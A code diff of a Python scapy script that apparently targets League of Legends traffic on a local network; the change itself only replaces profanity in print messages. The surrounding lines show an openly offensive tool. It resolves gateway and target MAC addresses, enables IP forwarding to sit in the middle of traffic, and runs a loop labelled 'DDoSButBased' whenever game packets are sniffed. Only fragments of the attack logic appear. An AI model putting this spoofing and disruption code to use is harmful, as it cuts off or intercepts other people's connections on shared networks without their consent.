@@ -9,7 +9,7 @@ def LeagueCanceller(pkt, targets, interface, MACs):
     try:
         if(isLeagueIP(pkt[scapy.IP].dst) or isLeagueIP(pkt[scapy.IP].src)):
             while 1:
-                print("FUCK YOU DWEEB")
+                print("FUBBERNUCK YOU DWEEB")
                 print(f'the targets are {targets} and the interface is {interface}')
                 DDoSButBased(targets, interface, MACs)
     except Exception:
@@ -50,7 +50,7 @@ class Attack(object):
             
 def Rosie(interface, gWayT, target, fwd):
     if ((not target) or (not gWayT)):
-        print("Fucking add some arguments damn\n")
+        print("FUBBERNUCKing add some arguments\n")
         sys.exit(1)
     #Setting up attack
     targets = [gWayT, target]
@@ -58,14 +58,14 @@ def Rosie(interface, gWayT, target, fwd):
         MACs = [PreAttack(targets[0], interface).getMacNCheese(), PreAttack(targets[1], interface).getMacNCheese()] 
         print('[POGGED]')
     except Exception:
-        print('[FUCK]\n no address(es)')
+        print('[FUBBERNUCK]\n no address(es)')
         sys.exit(1)
     try:
         if fwd:
             PreAttack.togggleIPForward().enableIPForward()
             print("[POGGED]")
     except IOError:
-        print('[FUCK]')
+        print('[FUBBERNUCK]')
         try:
             choice = scapy.raw_input('Proceed? [y/N]').strip().lower()[0]
             if choice == 'y':
@@ -102,7 +102,7 @@ def Rosie(interface, gWayT, target, fwd):
             PreAttack.togggleIPForward().disableIPForward()
             print('[POGGED]')
     except IOError:
-        print('[FUCK]')
+        print('[FUBBERNUCK]')
 
 def DDoSButBased(targets, interface, MACs):
     for i in range(0,16):
@@ -110,7 +110,7 @@ def DDoSButBased(targets, interface, MACs):
             Attack(targets, interface).FixItFelix(MACs)
             #sniff(prn=lambda x:x.summary(), count=1)
         except(Exception, KeyboardInterrupt):
-            print('[FUCK]')
+            print('[FUBBERNUCK]')
             sys.exit(1)
         time.sleep(0.25)
     print('[POGGED]')
